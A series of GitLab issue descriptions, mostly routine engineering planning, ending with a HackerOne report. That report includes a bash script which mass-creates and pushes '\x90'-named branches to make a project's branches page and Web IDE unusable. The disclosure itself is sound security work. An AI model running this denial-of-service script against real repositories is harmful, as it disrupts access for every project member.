title: Determine cause for gradual increase in Elasticsearch latency since 2020-11-02
description:
Noted originally in my tracking of https://gitlab.com/gitlab-com/www-gitlab-com/-/issues/9559 we can see the median group scoped search latency has increased from 2s to 8s in the last month. We can't think of any specific application changes that would cause this [nor do we have evidence this is happening in our performance testing against reference architectures](https://gitlab.com/gitlab-com/www-gitlab-com/-/issues/9559#note_462510840)

## Data

We should have more data in the [Rails Controller](https://dashboards.gitlab.net/d/web-rails-controller/web-rails-controller?orgId=1) dashboard to help point out the problem but for some reason the Elasticsearch graph won't show anything beyond the last 7 days.

But we do have the [Elastic Monitoring Cluster](https://00a4ef3362214c44a044feaa539b4686.us-central1.gcp.cloud.es.io:9243/app/monitoring#/elasticsearch/indices/gitlab-production-202010260000/advanced?_g=(cluster_uuid:HdF5sKvcT5WQHHyYR_EDcw,refreshInterval:(pause:!f,value:10000),time:(from:'2020-11-05T22:26:04.006Z',to:'2020-12-09T05:13:10.625Z'))) which seems to indicate a gradual growth in overall search latency in the last 30 days:

![Screen_Shot_2020-12-09_at_5.11.22_pm](/uploads/237b66751b17f1faab195e7a9799adee/Screen_Shot_2020-12-09_at_5.11.22_pm.png)

There doesn't seem to be any correlation in search volume growth in the last 30 days:

![Screen_Shot_2020-12-09_at_5.12.22_pm](/uploads/47a58893810e145d5d1428d367605caf/Screen_Shot_2020-12-09_at_5.12.22_pm.png)

which implies the problem is not simply a matter of growing usage but instead the searches are just getting slower for some reason.

## Elastic support case

https://support.elastic.co/customers/s/case/5004M00000ekZRXQA2/gradual-increase-in-latency-over-last-month-leading-to-4x-slower-searches

## Other resources

1. https://www.elastic.co/blog/advanced-tuning-finding-and-fixing-slow-elasticsearch-queries
1. https://www.elastic.co/guide/en/elasticsearch/reference/7.0/tune-for-search-speed.html

epic.title: Performance Improvements for Elasticsearch Latency

title: [Feature flag] Rollout of `export_user_permissions_feature_flag`
description:
<!-- Title suggestion: [Feature flag] Enable description of feature -->

## What

Remove the `:export_user_permissions_feature_flag` feature flag introduced by gitlab-org/gitlab!49399

## Owners

- Team: ~"group::compliance" 
- Most appropriate slack channel to reach out to: `#g_manage_compliance`
- Best individual to reach out to: Aishwarya Subramanian (@asubramanian1)

## Expectations

### What are we expecting to happen?

### What might happen if this goes wrong?

### What can we monitor to detect problems with this?

<!-- Which dashboards from https://dashboards.gitlab.net are most relevant? Sentry errors reports can alse be useful to review -->


## Beta groups/projects

If applicable, any groups/projects that are happy to have this feature turned on early. Some organizations may wish to test big changes they are interested in with a small subset of users ahead of time for example.

- `gitlab-org/gitlab` project
- `gitlab-org`/`gitlab-com` groups
- ...

## Roll Out Steps

- [ ] Confirm that QA tests pass with the feature flag enabled (if you're unsure how, contact the relevant [stable counterpart in the Quality department](https://about.gitlab.com/handbook/engineering/quality/#individual-contributors))
- [x] Enable on staging (`/chatops run feature set export_user_permissions_feature_flag true --staging`)
- [x] Test on staging
- [x] Ensure that documentation has been updated

**NA** below as it's a self-managed feature.

- [-] Enable on GitLab.com for individual groups/projects listed above and verify behaviour  (`/chatops run feature set export_user_permissions_feature_flag true`)
- [-] Coordinate a time to enable the flag with the SRE oncall and release managers
  - In `#production` mention `@sre-oncall` and `@release-managers`. Once an SRE on call and Release Manager on call confirm, you can proceed with the rollout
- [-] Announce on the issue an estimated time this will be enabled on GitLab.com
- [-] Enable on GitLab.com by running chatops command in `#production` (`/chatops run feature set feature_name true`)
- [-] Cross post chatops Slack command to `#support_gitlab-com` ([more guidance when this is necessary in the dev docs](https://docs.gitlab.com/ee/development/feature_flags/controls.html#where-to-run-commands)) and in your team channel
- [-] Announce on the issue that the flag has been enabled
- [x] Remove feature flag and add changelog entry
- [x] After the flag removal is deployed, [clean up the feature flag](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) by running chatops command in `#production` channel (Cleaned up on [`staging`](https://gitlab.slack.com/archives/CLM200USV/p1613675368028900))

## Rollback Steps

- [ ] This feature can be disabled by running the following Chatops command:

```
/chatops run feature set export_user_permissions_feature_flag false
```

title: Deploy tokens list APIs should permit filtering for active tokens
description:
<!-- The first section "Release notes" is required if you want to have your release post blog MR auto generated. Currently in BETA, details on the **release post item generator** can be found in the handbook:  https://about.gitlab.com/handbook/marketing/blog/release-posts/#release-post-item-generator and this video: https://www.youtube.com/watch?v=rfn9ebgTwKg. The next four sections: "Problem to solve", "Intended users", "User experience goal", and "Proposal", are strongly recommended in your first draft, while the rest of the sections can be filled out during the problem validation or breakdown phase. However, keep in mind that providing complete and relevant information early helps our product team validate the problem and start working on a solution. -->

### Release notes

<!-- What is the problem and solution you're proposing? This content sets the overall vision for the feature and serves as the release notes that will populate in various places, including the [release post blog](https://about.gitlab.com/releases/categories/releases/) and [Gitlab project releases](https://gitlab.com/gitlab-org/gitlab/-/releases). " -->

[List deploy token APIs](https://docs.gitlab.com/ee/api/deploy_tokens.html) allow filtering for only active tokens.

### Problem to solve 

<!-- What problem do we solve? Try to define the who/what/why of the opportunity as a user story. For example, "As a (who), I want (what), so I can (why/value)." -->

The Deploy Tokens API endpoints for listing tokens (project/group/etc. levels) return all database stored entries, including revoked and expired tokens.

Furthermore, the revoke state is not added to the returned entity, so an end-user cannot perform a client-side filter removing revoked tokens from the list returned.

The feature proposed here will resolve the need to list only active tokens from the REST API.

### Intended users

<!-- Who will use this feature? If known, include any of the following: types of users (e.g. Developer), personas, or specific company roles (e.g. Release Manager). It's okay to write "Unknown" and fill this field in later.

Personas are described at https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/
-->

* [Cameron (Compliance Manager)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#cameron-compliance-manager)
* [Devon (DevOps Engineer)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#devon-devops-engineer)
* [Sidney (Systems Administrator)](https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/#sidney-systems-administrator)

### User experience goal

<!-- What is the single user experience workflow this problem addresses?
For example, "The user should be able to use the UI/API/.gitlab-ci.yml with GitLab to <perform a specific task>"
https://about.gitlab.com/handbook/engineering/ux/ux-research-training/user-story-mapping/ -->

The user should be able to use the API to retrieve only, or properly filter for, currently active tokens.


### Proposal

<!-- How are we going to solve the problem? Try to include the user journey! https://about.gitlab.com/handbook/journeys/#user-journey -->

Two changes:

- Add a filter params `revoked` and `expired`, of boolean types, that filter the returned response of all tokens.
  - `revoke` being true will return only revoked tokens
  - `revoke` being false will return only un-revoked tokens
  - `expired` being true will return only expired tokens
  - `expired` being false will return only un-expired tokens
  - Both filters as true will return actual active tokens, matching [list shown on the Web UI](https://docs.gitlab.com/ee/user/project/deploy_tokens/#revoking-a-deploy-token)
- Add `revoked` state key-values to the returned `DeployToken` entity to allow end-users to differentiate between revoked and un-revoked tokens in any response.

### Further details

<!-- Include use cases, benefits, goals, or any other details that will help us understand the problem better. -->

Came up in a Premium plan customer's support request https://gitlab.zendesk.com/agent/tickets/183005 (internal)

### Permissions and Security

<!-- What permissions are required to perform the described actions? Are they consistent with the existing permissions as documented for users, groups, and projects as appropriate? Is the proposed behavior consistent between the UI, API, and other access methods (e.g. email replies)?
Consider adding checkboxes and expectations of users with certain levels of membership https://docs.gitlab.com/ee/user/permissions.html
* [ ] Add expected impact to members with no access (0)
* [ ] Add expected impact to Guest (10) members
* [ ] Add expected impact to Reporter (20) members
* [ ] Add expected impact to Developer (30) members
* [ ] Add expected impact to Maintainer (40) members
* [ ] Add expected impact to Owner (50) members -->

Existing permissions over the Deploy Tokens API endpoints remain sufficient.

### Documentation

<!-- See the Feature Change Documentation Workflow https://docs.gitlab.com/ee/development/documentation/workflow.html#for-a-product-change

* Add all known Documentation Requirements in this section. See https://docs.gitlab.com/ee/development/documentation/feature-change-workflow.html#documentation-requirements
* If this feature requires changing permissions, update the permissions document. See https://docs.gitlab.com/ee/user/permissions.html -->

Deploy Tokens API documentation for list actions will require updates: https://docs.gitlab.com/ee/api/deploy_tokens.html

### Availability & Testing

<!-- This section needs to be retained and filled in during the workflow planning breakdown phase of this feature proposal, if not earlier.

What risks does this change pose to our availability? How might it affect the quality of the product? What additional test coverage or changes to tests will be needed? Will it require cross-browser testing?

Please list the test areas (unit, integration and end-to-end) that needs to be added or updated to ensure that this feature will work as intended. Please use the list below as guidance.
* Unit test changes
* Integration test changes
* End-to-end test change

See the test engineering planning process and reach out to your counterpart Software Engineer in Test for assistance: https://about.gitlab.com/handbook/engineering/quality/test-engineering/#test-planning -->

Existing API tests will require changes to cover filters for list queries, and for the new `revoked` field returned in the response.

### What does success look like, and how can we measure that?

<!--
Define both the success metrics and acceptance criteria. Note that success metrics indicate the desired business outcomes, while acceptance criteria indicate when the solution is working correctly. If there is no way to measure success, link to an issue that will implement a way to measure this.

Create tracking issue using the the Snowplow event tracking template. See https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Snowplow%20event%20tracking.md
-->

### What is the type of buyer?

<!-- What is the buyer persona for this feature? See https://about.gitlab.com/handbook/marketing/product-marketing/roles-personas/buyer-persona/
In which enterprise tier should this feature go? See https://about.gitlab.com/handbook/product/pricing/#four-tiers -->

### Is this a cross-stage feature?

<!-- Communicate if this change will affect multiple Stage Groups or product areas. We recommend always start with the assumption that a feature request will have an impact into another Group. Loop in the most relevant PM and Product Designer from that Group to provide strategic support to help align the Group's broader plan and vision, as well as to avoid UX and technical debt. https://about.gitlab.com/handbook/product/#cross-stage-features -->

### Links / references

Read the descriptions on https://gitlab.com/gitlab-org/gitlab/-/labels to find the correct ones -->

title: Migrate Badges with the Group
description:

title: New security user can't find more details about vulnerabilities
description:
## Summary
I spoke with a new user of the dependency scanner the other day. After getting it set up he went to the Dashboard and noticed that it had found vulnerabilities. Upon trying to find solutions for the vulnerabilities he had a very difficult time figuring out where to go and what to click on in order to find more details about them.

## Short-term Solution

We will implement the link highlight change as seen in https://gitlab.com/gitlab-org/gitlab/-/issues/292595/designs/b05_Row-hover-use-cases.png

1. On-row-hover: underline the description/link-item.
   * this signals to the user that they can click on this to view the details page.
1. On-description/link-item hover: change the style to the link style (Underlined-blue)
   * This reinforces the link is a link in GitLab.

## Long-term Solution
Update tables: https://gitlab.com/gitlab-org/gitlab/-/issues/292808

cc @gitlab-com/gitlab-ux/secure-defend-ux

## Implementation plan

- [ ] ~frontend `ee/app/assets/javascripts/security_dashboard/components/vulnerability_list.vue` Update CSS for the vulnerability title so that when hovered it's blue and underlined. There should be some available classes for that. A quick list for available classes can be seen here: https://unpkg.com/browse/@gitlab/ui/src/scss/utilities.scss
- [ ] ~frontend Update the vulnerability row in the same file so that when it's hovered the background is gray.

epic.title: Enterprise tables and actions at scale

title: Add Guidelines for Docker images to Secure Technical Documentation
description:
### Problem to solve

While working on [Engineering discovery: allow secure analyzer docker containers to run as a non-root user to support OpenShift](https://gitlab.com/gitlab-org/gitlab/-/issues/281816), it was determined that Secure analyzers should run as an unprivileged `gitlab` user instead of running as `root`. In order to communicate this information, we need to add it to the [Secure Technical Documentation](https://about.gitlab.com/handbook/engineering/development/secure/tech-docs/).

### Further details

See related discussion [here](https://gitlab.com/gitlab-org/gitlab/-/issues/281816#note_453040821)

### Proposal

Add a new `Guidelines for Docker Images` section to the [Secure Technical Documentation handbook page](https://gitlab.com/gitlab-com/www-gitlab-com/blob/bfe860a74e8/sites/handbook/source/handbook/engineering/development/secure/tech-docs/index.html.md). These guidelines should include the following details:

> Analyzers MUST be executed using an underprivileged user with the name `gitlab`

### Who can address the issue

~"group::composition analysis" 

### Other links/references

https://gitlab.com/gitlab-org/gitlab/-/issues/281816

/cc @NicoleSchwartz @gonzoyumo @fcatteau

epic.title: OpenShift support for Secure Software Composition Analysis

title: Include all available quick actions in autocomplete
description:
> this is a follow up from https://gitlab.com/gitlab-org/gitlab/-/issues/290988#note_462045190

## Problem

When you type `/` in a comment or description, we only show 5 quick actions by default:

![Screen_Shot_2020-12-08_at_5.02.57_PM](/uploads/d8f71898db860ebdbc17992a7ad695f4/Screen_Shot_2020-12-08_at_5.02.57_PM.png)

This makes the other quick actions not easily discoverable as I would have to open our documentation to view them all. We also want to work towards removing this:

![Screen_Shot_2020-12-08_at_5.11.47_PM](/uploads/77e8c011aa36a0deaf7bfcec36c6da88/Screen_Shot_2020-12-08_at_5.11.47_PM.png)

From every comment box. This would also help offset the discoverability problem if we were to move forward with that. 

## Proposal

Show all Quick Actions as a scrollable list in the autocomplete modal.

### Release notes

![quick-actions](/uploads/3c7a05aabe9c06ca2122f2e3a6245214/quick-actions.png)

All available [Quick Actions](https://gitlab.com/help/user/project/quick_actions) are now displayed in a scrollable list when `/` is entered into a description or comment field. Quick Actions are a great way to efficiently update data on an issue, merge request, or epic and this small improvement helps them be more discoverable directly within the context where they are used.

title: Add usage ping counters for Quick Actions
description:
## Problem To Solve

Quick Actions are used by power users, but they are very simple and if only more people would know them, they would use them (at least that is my hypothesis). Once someone finds out about them -they will feel delight.

**Why should we consider them simple instead of a power tool?**

Slack has democratized the / commands and therefore I don't consider Quick Actions a power tool that limited audience will use.

We have spent so much energy building these out -- and it is a shame that people don't know about them. Instead of focusing our energy on adding every single item in UX and then dealing with the inevitable response (Too many things in the UI, its cluttered, etc) -- it would be great to make them discoverable.

## Proposal 

If we want to improve -we need to measure, experiment, measure.

Place a :white_check_mark: next to each command once MAU counters have been added for each. 

| Command                                                   | Issue | Merge request | Epic | Action                                                                                                                                                                                                                                                                                                              |
|-----------------------------------------------------------|-------|---------------|------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| /approve                                                  |       | ✓             |      | Approve the merge request.                                                                                                                                                                                                                                                                                          |
| /assign @user                                             | ✓     | ✓             |      | Assign one user.                                                                                                                                                                                                                                                                                                    |
| /assign @user1 @user2                                     | ✓     | ✓             |      | Assign multiple users.                                                                                                                                                                                                                                                                                              |
| /assign me                                                | ✓     | ✓             |      | Assign yourself.                                                                                                                                                                                                                                                                                                    |
| /award :emoji:                                            | ✓     | ✓             | ✓    | Toggle emoji award.                                                                                                                                                                                                                                                                                                 |
| /child_epic <epic>                                        |       |               | ✓    | Add child epic to <epic>. The <epic> value should be in the format of &epic, group&epic, or a URL to an epic (introduced in GitLab 12.0).                                                                                                                                                                           |
| /clear_weight                                             | ✓     |               |      | Clear weight.                                                                                                                                                                                                                                                                                                       |

title: [Experiment Cleanup]: MVC Add contact sales option in app
description:
## Summary
The purpose of this issue is to clean up the following experiment https://gitlab.com/gitlab-org/gitlab/-/issues/219944. This experiment was deemed a success via this tracking issue https://gitlab.com/gitlab-org/gitlab/-/issues/238207 and thus the experience should be made permanent. 
 
This issue should be closed out when the experiment code is removed and this experience is live on production for 100% of users.

## Steps

- [X] Determine whether the feature should apply to SaaS and/or self-managed
  * This should appear only in SaaS as the page the experiment was run on (GitLab.com billings page) only exists for SaaS users
- [X] Determine whether the feature should apply to EE - and which tiers - and/or Core
  * This should appear for all users within the SaaS product regardless of their tier as long as they have the permissions that allow them to view the in-app billings page. 
- [X] Determine if tracking should be kept as is, removed, or modified.
  * Tracking should be left intact as it allows us to understand on an ongoing basis how many leads this work is sending to the sales team. 
- [-] Migrate experiment to a default enabled [feature flag](https://docs.gitlab.com/ee/development/feature_flags/development.html) for one milestone and add a changelog. Converting to a feature flag can be skipped at the ICs discretion if risk is deemed low with consideration to both SaaS and (if applicable) self managed.
  - Skipping, as the risk is very low
- [-] Ensure any relevant documentation has been updated.
  - Skipping, as I don’t believe there is any relevant documentation to update nor does it seem like this simple feature needs documentation to explain its presence or usage
- [x] [Remove the feature flag](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) in the same milestone.
- [x] After the flag removal is deployed, [clean up the feature/experiment feature flags](https://docs.gitlab.com/ee/development/feature_flags/controls.html#cleaning-up) by running chatops command in `#production` channel

title: Use application settings to guard access to trial-related entities
description:
## Current Situation

### Billings Controllers

For `Groups::BillingsController` & `Profiles::BillingsController`, we’re checking that the `check_namespace_plan` application setting is enabled:

```ruby
class Groups::BillingsController < Groups::ApplicationController
  before_action :verify_namespace_plan_check_enabled
end
```

```ruby
module EE
  module ApplicationController
    def verify_namespace_plan_check_enabled
      render_404 unless ::Gitlab::CurrentSettings.should_check_namespace_plan?
    end
  end
end
```

```ruby
module Gitlab
  module CurrentSettings
    class << self
      def method_missing(name, *args, **kwargs, &block)
        # `current_application_settings` essentially leads to `ApplicationSetting.current`,
        # which is just a cached version of the only `ApplicationSetting` record an instance should have.
        current_application_settings.send(name, *args, **kwargs, &block)
      end
    end
  end
end
```

```ruby
module EE
  module ApplicationSetting
    def should_check_namespace_plan?
      check_namespace_plan? && (Rails.env.test? || ::Gitlab.dev_env_org_or_com?)
    end
  end
end
```

### Trials Controllers

However, `TrialsController` & `TrialRegistrationsController` only check for `Gitlab.dev_env_or_com?`:

```ruby
class TrialsController < ApplicationController
  before_action :check_if_gl_com_or_dev
end
```

```ruby
module EE
  module ApplicationController
    def check_if_gl_com_or_dev
      render_404 unless ::Gitlab.dev_env_or_com?
    end
  end
end
```

But it seems to me that trials only make sense in the context of paid namespace plans. And since we’re already checking a similar thing to `Gitlab.dev_env_or_com?` in `ApplicationSetting.should_check_namespace_plan?` (we’re doing `Gitlab.dev_env_org_or_com?`) it shouldn’t have any ill-effects.

## Proposal

So, I’m proposing that we use the `verify_namespace_plan_check_enabled` filter for `TrialsController` & `TrialRegistrationsController`, and that we use `Gitlab::CurrentSettings.should_check_namespace_plan?` for other places that it makes sense, such as trial-focused partials as part of other flows.

---

title: Delete an Iteration
description:
## Problem To Solve

title: Add aggregate counts for epic related user driven events
description:
> This is the implementation issue that came out of https://gitlab.com/gitlab-data/analytics/-/issues/5280

## Goal

Track user interactions with epics within the [usage ping] so that we can calculate Monthly Active Users (MAU) for Plan. It is important that we have an accurate reflect of MAU as it is one of the primary metrics that GitLab leadership uses to [make informed investment decisions](https://about.gitlab.com/handbook/product/investment/) across the product.

## Product Planning MAU Definition

[The sum of all unique users that took an action within an epic over a given period of time.]

## Proposal

Implement a counter in the [usage ping] that aggregates the total count of unique users that took an action on an epic.

 
## Events To Aggregate In [Usage Ping]

| Action | Description | Added To Counter | Assignee | Sisense |
|--------|-------------|------------------|----------|---------|

| epic_due_date_fixed_changed | Epic due date changed manually | !57672 | @cablett | [view chart](https://app.periscopedata.com/app/gitlab/775807/Plan-xMAU-(monthly)?widget=11718779&udv=0) |

| epic_cross_reference | Epic is referenced somewhere else (comment, issue description) | https://gitlab.com/gitlab-org/gitlab/-/merge_requests/59804 | @felipe_artur | |
| epic_destroyed | Epic is destroyed | https://gitlab.com/gitlab-org/gitlab/-/merge_requests/59185 | @felipe_artur | [view chart](https://app.periscopedata.com/app/gitlab/775807/Plan-xMAU-(monthly)?widget=11718805&udv=0) |
| epic_emoji_awarded | Emoji awarded on epic | https://gitlab.com/gitlab-org/gitlab/-/merge_requests/60787 | @cablett | [view chart](https://app.periscopedata.com/app/gitlab/775807/Plan-xMAU-(monthly)?widget=11718841&udv=0) |
| epic_emoji_unawarded | Emoji unawarded on epic | https://gitlab.com/gitlab-org/gitlab/-/merge_requests/60989 | @cablett | |

Note: Those marked with `*` are now being tracked using resource events. So we must also account for records in those tables.

## Implementation details

* We can use redis counters to track user interactions in the table in the same way it was used for [aggregate counts for issues](https://gitlab.com/gitlab-org/gitlab/-/issues/229918), also it was suggested to use a separate feature flag for each event - https://gitlab.com/gitlab-org/gitlab/-/issues/292253#note_467355562

* for actions for which we already add an action event, we can use `track_action_event` counter (https://gitlab.com/gitlab-org/gitlab/-/issues/292253#note_483763723)

## Bonus

title: Persist or cache queue for reindexing
description:
The following discussion from !48698 should be addressed:

- [ ] @alexkalderimis started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/48698#note_462392193):  (+2 comments)

    > Since the strategy is fetch all indices, and calculate stats one-by-one only to pick the top two, this suggests that the vast majority of the work is wasted. 
    > 
    > Perhaps we can cache these expensive calculations for subsequent runs - calling this twice in a few hours even is unlikely to have significantly different effects. Perhaps a redis key with a relatively short TTL would work here?

title: Remove duplicate rows from `vulnerability_occurrences` table
description:
### Summary

During work on https://gitlab.com/gitlab-org/gitlab/-/issues/212322 it came to our attention that the current logic in `Security::StoreReportService` will result in entries for which our method of calculating UUIDv5 will yield duplicate values. This is would violate the `CREATE UNIQUE INDEX index_vulnerability_occurrences_on_uuid ON vulnerability_occurrences USING btree (uuid);` constraint present in the database.

We need to remove rows that would result in duplicate UUIDv5 values

### Implementation plan

* [x] ~database Create a post-deployment migration that:
  * [x] Has timestamp lower than `20201112130715`
  * [x] Creates an index on `(project_id, report_type, location_fingerprint, primary_identifier_id, id)`
  * [x] Drops the duplicates using `EachBatch`
  * [x] Removes the index on `(project_id, report_type, location_fingerprint, primary_identifier_id, id)`

title: Setting user availability always returns a status
description:
The following discussion from !49203 should be addressed:

- [ ] @mikolaj_wawrzyniak started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/49203#note_462163976):  (+1 comment)

    > **Thought (non-blocking):** This is very clever work around, I've done some digging and noticed that the root cause seems to be different. It seems that with `availability` added to user status that takes one of two states `not_set` or `busy` when user clicks remove status button, or clear message and emoji manually, `availability` is still send as `not_set` within request. Due to that at [`User::SetStatusService`](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/services/users/set_status_service.rb#L17) this request is misinterpreted as status update instead of status removal, that seems to later cause described problems where status seems to be removed, but `current_user.status.present?` continues to evaluate to true. 
    > 
    > This comment is not blocking though, because your approach improves UX even if underlying backend problem remains. However I believe it will be good to address root cause in the follow up MR to avoid confusing behavior in the future.

title: Adjust `Security::StoreReportService` to look up findings using UUIDv5
description:
### Summary

During work on https://gitlab.com/gitlab-org/gitlab/-/issues/212322 it came to our attention that the current logic in `Security::StoreReportService` will result in entries for which our method of calculating UUIDv5 will yield duplicate values. This is would violate the `CREATE UNIQUE INDEX index_vulnerability_occurrences_on_uuid ON vulnerability_occurrences USING btree (uuid);` constraint present in the database.

We need to adjust the logic present in `Security::StoreReportService#create_or_find_vulnerability_finding` to match the following flowchart.

![image](/uploads/f617f51a31861e3ebd55f9ce563d28fe/image.png)

### Implementation plan

* [x] ~backend Create `find_finding_by_uuidv5`
* [x] ~backend Create `find_finding_by_find_params`
* [x] ~backend Adjust `create_or_find_vulnerability_finding` so that it uses above methods to find any duplicate findings before creating new ones

title: Show version of Go when building Secure analyzers
description:
### Problem to solve 

Secure analyzer projects implemented in Go are build using a multi-stage Dockerfile that uses `golang:X.YZ` as a base image, making it difficult to know what version of Go was used to build one particular version of the analyzer (one particular Docker image).

See https://gitlab.com/gitlab-org/gitlab/-/issues/284643 for more on why this is needed.

### Proposal

Update the build script the multi-stage Dockerfile relies on to build the Go project, and make it report the version of Go.
After [Remove duplication from secure analyzer Dockerfiles](https://gitlab.com/gitlab-org/gitlab/-/issues/289983) has been completed, this is as simple as adding `go version` to the shared build script.

### Implementation plan

- [ ] add `go version` to the build script introduced in https://gitlab.com/gitlab-org/gitlab/-/issues/289983

### Is this a cross-stage feature?

This applies to ~"Category:Container Scanning" so it applies to the entire ~"section::sec" section.

title: When using the reply shortcut, insert quote in thread reply instead of new comment
description:
### Summary

Users can already select text and hit `r` to quote that content. However, that gets posted into an entirely new comment instead of as reply to that thread, which is pretty annoying as you not only lose the context, but also as the site scrolls all the way to the bottom, and you have to find the space again where you wanted to quote from.

![Reply_shortcut](/uploads/91584cdc637ff96afa9af0caff767b1d/Reply_shortcut.mp4)

title: https://gitlab.com/gitlab-org/gitlab/-/issues/292062 follow-up
description:
This follows-up on this ~"master:broken" issue: https://gitlab.com/gitlab-org/gitlab/-/issues/292062

# What happened

Two MRs got merged consecutively:

* https://gitlab.com/gitlab-org/gitlab/-/merge_requests/48705 introduced a `@connection` directive in a GraphQL query because some paginated data had to be optimistically updated. The directive allowed the data to be stored in Apollo's cache with a static key, making it easier to read/write the cached query. More on this here: https://www.apollographql.com/docs/react/v2/caching/cache-interaction/#the-connection-directive
* https://gitlab.com/gitlab-org/gitlab/-/merge_requests/48940 introduced a test where the above query was being mocked via `mock-apollo-client`, which is what actually broke `master`.

# Why?

What exactly happened is similar to what's described in this `apollo-client` issue: https://github.com/apollographql/apollo-client/issues/2518

When it encounters a `@connection` directive, `apollo-client` strips it out of the cache key when caching the data.

The thing is that `mock-apollo-client` uses `apollo-client`'s [actual cache layer](https://github.com/Mike-Gibson/mock-apollo-client/blob/v0.4.0/src/mockClient.ts#L24-L27), but it provides its own [mocked link](https://github.com/Mike-Gibson/mock-apollo-client/blob/v0.4.0/src/mockClient.ts#L29), with its own way of building [cache keys](https://github.com/Mike-Gibson/mock-apollo-client/blob/v0.4.0/src/mockLink.ts#L58-L66) that does _not_ strip the `@connection` directive.

This results in a discrepancy between mocked request handlers and what's actually in the cache, as any query containing a `@connection` query can not be traced back to the cache.

So, when mocking `apollo-client` in tests, queries containing a `@connection` directive would always be considered not mocked and would never resolve properly.

# How do we fix this?

- [x] Revert the changes that caused the failure.
  * The failure was initially reported in https://gitlab.com/gitlab-org/gitlab/-/issues/292062.
  * https://gitlab.com/gitlab-org/gitlab/-/merge_requests/48940 was identified as the culprit and got reverted in https://gitlab.com/gitlab-org/gitlab/-/merge_requests/49401
- [x] Contribute a fix to the upstream project.
  * A fix has been submitted to the upstream project: https://github.com/Mike-Gibson/mock-apollo-client/pull/20
  * It got merged and released in `mock-apollo-client@0.5.0`: https://github.com/Mike-Gibson/mock-apollo-client/releases/tag/v0.5.0
- [x] Once the fix is merged and released, upgrade the package in GitLab.
  * Upgrade MR: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/49467
- [x] Reintroduce the changes that caused the failures.
  * MR: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/49435
- [x] Document the `@connection` key in GitLab's development docs.
  * Documentation MR: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/49471

title: The "\xH" notation in the branch name makes the page “/-/branches” not available to everyone.
description:
**[HackerOne report #1046666](https://hackerone.com/reports/1046666)** by `stanlyoncm` on 2020-11-29, assigned to @ngeorge1:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

==Report in Spanish:==

#####  Summary

Un desarrollador que empuja cualquier rama con un nombre que contenga la notación hexadecimal `\xH`, por ejemplo `\x90`, es capaz de hacer que la pagina en `/-/branches` no este disponible para todos los usuarios, dando como resultado una perdida de disponibilidad en este componente.

Otro componente afectado por esta vulnerabilidad es el __Web IDE__, si bien es cierto que se puede acceder a esta característica, usted no podrá trabajar con normalidad, ya que, al intentar seleccionar algunas de las ramas del proyecto recibiera el siguiente mensaje por parte del servidor *“Error al cargar ramas \ inténtelo de nuevo”*

Para llevar a cabo este ataque el atacante solo debe crear una rama con el nombre `\x90`, hacer una confirmación y empujar la rama. Sin embargo he desarrollado un pequeño script en __bash__ que además crea ramas con este nombre de forma recursiva.  
 

_Translated by Google_

A developer who pushes any branch with a name that contains the hexadecimal notation \ xH, for example \ x90, is able to make the page in / - / branches not available to all users, resulting in a loss of availability in this component.
Another component affected by this vulnerability is the Web IDE, although it is true that this feature can be accessed, you will not be able to work normally, since, when trying to select some of the project branches, you will receive the following message from the server "Failed to load branches \ try again"
To carry out this attack, the attacker only has to create a branch with the name \ x90, make a confirmation and push the branch. However, I have developed a small bash script that also recursively creates branches with this name.
   
#####  Steps to reproduce

__[Preparación]__

__1)__ Ingrese a Gitlab.com

__2)__ Cree un proyecto nuevo.

__3)__ Invite un nuevo miembro con permisos de desarrollador.  


 
   
__[Flujo del ataque]__ *(miembro invitado con permisos de desarrollador)*

__1)__ Clone e ingrese al proyecto.

__2)__ Establezca su configuración de username e email. *(git config --global user.name ‘username’)...*

__3)__ Copie las siguientes líneas escritas en __bash__ y péguelas en su archivo `~/.bashrc`: ![exploit.txt](https://h1.sec.gitlab.net/a/b5a6009a-eba5-4452-be6f-d2f2a0db39b8/exploit.txt)


_Translated by Google_

1) Go to Gitlab.com
2) Create a new project.
3) Invite a new member with developer permissions.

[Attack flow] (guest member with developer permissions)
1) Clone and enter the project.
2) Set your username and email settings. (git config --global user.name 'username') ...
3) Copy the following lines written in bash and paste them into your ~ / .bashrc file:

```bash  
###  Copy and Paste in ~/.bashrc  
###  You must run this script from a terminal with the bash interpreter

function createStoreDir(){  
  nops_dir=$(mktemp -d)  
}

function genNop(){  
  branchName=\\x90  
  nop=  
  limitNops=$1  
  for name in $(seq 1 $limitNops);do  
    nop+=\\x90  
    echo $nop  
  done  
}

function createBranches(){  
  for line in $(cat $nops_dir/nops_$1.txt);do  
     git checkout -b $(echo -e $line)  
     echo 'DoS' > DoS  
     git add .  
     git commit -m 'DoS'  
  done  
}

function pushBranches(){  
  for branch in $(cat $nops_dir/nops_$1.txt);do  
    (git push origin $(echo -e $branch) &)  
  done  
}

function main(){  
  args=$1  
  createStoreDir

  if [ -d "./.git" ];then  
    for arg in ${args[@]};do  
      genNop $arg > $nops_dir/nops_$arg.txt  
      createBranches $arg  
      pushBranches $arg  
    done  
  else  
   echo "No Git folder"  
  fi  
}

function exploit(){  
  main $1 &>/dev/null  
}
```

__4)__ Desde una terminal y con el interprete de __bash__ ejecute el comando `exec bash` para refrescar el archivo.

__5)__ Ahora estando dentro de la carpeta del proyecto que ha clonado ejecute la función `exploit 1`

